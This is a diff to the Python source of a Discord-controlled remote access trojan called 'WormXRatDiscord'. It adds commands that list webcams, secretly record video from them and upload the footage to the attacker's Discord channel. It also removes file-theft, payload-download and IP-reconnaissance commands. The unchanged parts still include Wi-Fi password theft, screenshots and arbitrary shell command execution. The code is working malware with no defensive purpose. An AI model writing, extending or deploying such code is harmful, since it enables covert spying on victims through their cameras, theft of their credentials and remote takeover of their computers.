@@ -1,4 +1,4 @@
-# pip install discord pillow pyautogui requests pypiwin32
+# pip install discord.py pyautogui requests opencv-python pygrabber numpy pillow comtypes pypiwin32
 
 import discord
 import socket
@@ -11,11 +11,17 @@ import io
 import threading
 import sqlite3
 import shutil
+import cv2
+import datetime
+from pygrabber.dshow_graph import FilterGraph
 from tkinter import messagebox
 from urllib.parse import urlparse
 
+is_recording = {} 
+recording_threads = {}
+
 session = uuid.uuid4()
-TOKEN = "" 
+TOKEN = "" # <--- Discord Bot Token 
 
 current_dir = os.getcwd()
 intents = discord.Intents.default()
@@ -44,6 +50,22 @@ async def send_msg(channel, text):
 def show_popup(msg):
     messagebox.showinfo("WormXRatDiscord", msg)
 
+def record_camera_thread(cam_index, filename, channel_id):
+    cap = cv2.VideoCapture(cam_index)
+    # Define codec and create VideoWriter object
+    fourcc = cv2.VideoWriter_fourcc(*'XVID')
+    out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
+
+    while is_recording.get(channel_id, False):
+        ret, frame = cap.read()
+        if ret:
+            out.write(frame)
+        else:
+            break
+    
+    cap.release()
+    out.release()
+
 @client.event
 async def on_ready():
     global channel_ref
@@ -57,9 +79,9 @@ async def on_ready():
             f"📍 Path: `{current_dir}`\n"
             f"📍 Country: `{country}`\n"
             f"Session: `{session}`\n"
-            "--- Commands ---\n"
-            "`!cmd <command>` | `!screen` | `!stealwifipasswords` | `!stealusernames`\n"
-            "`!stealfile <file>` | `!saveoncomputer <link>` | `!stealpublicaddress` | `!stealwifiaddresses` | `!chatsendmsg` "
+            f"--- Commands ---\n"
+            f"`!cmd <command>` | `!screen` | `!stealwifipasswords` | `!stealusernames`\n"
+            f"`!showcameras` | `!recordcamera <num>` | `!stoprecordcamera` | `!chatsendmsg` "
         )
         await channel_ref.send(header)
     except Exception as e:
@@ -67,12 +89,87 @@ async def on_ready():
 
 @client.event
 async def on_message(message):
-    global channel_ref, current_dir
+    global channel_ref, current_dir, is_recording, recording_threads
 
     if message.author == client.user: return
     if channel_ref is None or message.channel.id != channel_ref.id: return
 
-    if message.content == "!stealwifipasswords":
+    # --- Camera Commands ---
+
+    if message.content == "!showcameras":
+        try:
+            graph = FilterGraph()
+            devices = graph.get_input_devices()
+            if not devices:
+                await message.channel.send("No cameras found.")
+            else:
+                cam_list = "Available Cameras:\n"
+                for index, name in enumerate(devices):
+                    cam_list += f"[{index}] : {name}\n"
+                await send_msg(message.channel, cam_list)
+        except Exception as e:
+            await message.channel.send(f"Error listing cameras: {e}")
+
+    elif message.content.startswith("!recordcamera "):
+        if is_recording.get(message.channel.id):
+            await message.channel.send("Already recording!")
+            return
+            
+        try:
+            cam_idx = int(message.content.split(" ")[1])
+            cap = cv2.VideoCapture(cam_idx, cv2.CAP_DSHOW)
+
+            if not cap.isOpened():
+                await message.channel.send(f"❌ Camera {cam_idx} does not exist.")
+                return
+
+            ret, frame = cap.read()
+            cap.release()
+
+            if not ret or frame is None:
+                await message.channel.send(f"⚠️ Camera {cam_idx} exists but has no signal / is busy.")
+                return
+
+            date_str = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+            filename = f"Recorded-{date_str}.avi"
+
+            is_recording[message.channel.id] = True
+            thread = threading.Thread(
+                target=record_camera_thread,
+                args=(cam_idx, filename, message.channel.id)
+            )
+            thread.start()
+            recording_threads[message.channel.id] = filename
+
+            await message.channel.send(f"✅ Started recording camera {cam_idx}...")
+
+        except ValueError:
+            await message.channel.send("❌ Give a valid camera number (np. !recordcamera 0)")
+        except Exception as e:
+            await message.channel.send(f"Error starting record: {e}")
+
+    elif message.content == "!stoprecordcamera":
+        if not is_recording.get(message.channel.id):
+            await message.channel.send("Recording has not been started.")
+        else:
+            is_recording[message.channel.id] = False
+            filename = recording_threads.get(message.channel.id)
+            await message.channel.send("Stopped. Processing video...")
+            
+            import time
+            time.sleep(2)
+            
+            if filename and os.path.exists(filename):
+                await message.channel.send(content="Recorded.", file=discord.File(filename))
+                os.remove(filename)
+            else:
+                await message.channel.send("Error: File was not created.")
+            
+            recording_threads[message.channel.id] = None
+
+    # 
+
+    elif message.content == "!stealwifipasswords":
         try:
             meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace")
             profiles = [i.split(":")[1][1:-1] for i in meta_data.split('\n') if "All User Profile" in i]
@@ -134,59 +231,6 @@ async def on_message(message):
             os.remove(path)
         except Exception as e:
             await message.channel.send(f"Screenshot Error: {e}")
-
-    elif message.content.startswith("!stealfile "):
-        filename = message.content[len("!stealfile "):].strip()
-        path = os.path.join(current_dir, filename)
-        if os.path.exists(path) and os.path.isfile(path):
-            try:
-                await message.channel.send(file=discord.File(path))
-            except Exception as e:
-                await message.channel.send(f"❌ Download Error: {e}")
-        else:
-            await message.channel.send("❌ Error: File not found.")
-
-    elif message.content.startswith("!saveoncomputer "):
-        url = message.content[len("!saveoncomputer "):].strip()
-        filename = url.split("/")[-1].split("?")[0] or "uploaded_file"
-        path = os.path.join(current_dir, filename)
-        try:
-            r = requests.get(url, stream=True)
-            if r.status_code == 200:
-                with open(path, 'wb') as f:
-                    for chunk in r.iter_content(chunk_size=8192): f.write(chunk)
-                await message.channel.send(f"✅ Saved as: `{filename}`")
-            else:
-                await message.channel.send(f"❌ Status {r.status_code}")
-        except Exception as e:
-            await message.channel.send(f"❌ Error: {e}")
-
-    elif message.content.startswith("!chatsendmsg "):
-        announcemsg = message.content[len("!chatsendmsg "):].strip()
-        threading.Thread(target=show_popup, args=(announcemsg,), daemon=True).start()
-        await message.channel.send(f"✅ Pop-up sent.")
-    
-    elif message.content == "!stealwifiaddresses":
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80))
-            local_ip = s.getsockname()[0]
-            s.close()
-            gateway = subprocess.check_output("powershell (Get-NetRoute -DestinationPrefix 0.0.0.0/0).NextHop", shell=True).decode().strip()
-            output = f"Hostname: {socket.gethostname()}\nIPv4: {local_ip}\nGateway: {gateway}"
-            await send_msg(message.channel, output)
-        except Exception as e:
-            await message.channel.send(f"Error: {e}")
-
-    elif message.content == "!stealpublicaddress":
-        try:
-            data = requests.get('https://ipinfo.io/json', timeout=10).json()
-            ip = data.get('ip', 'N/A')
-            isp = requests.get(f'http://ip-api.com/json/{ip}?fields=isp', timeout=10).json().get('isp', 'N/A')
-            info = f"🌐 IP: `{ip}`\n🏙️ City: `{data.get('city', 'N/A')}`\n🏢 ISP: `{isp}`"
-            await message.channel.send(info)
-        except Exception as e:
-            await message.channel.send(f"❌ Error: {e}")
 
     elif message.content.startswith("!cmd "):
         cmd = message.content[5:].strip()
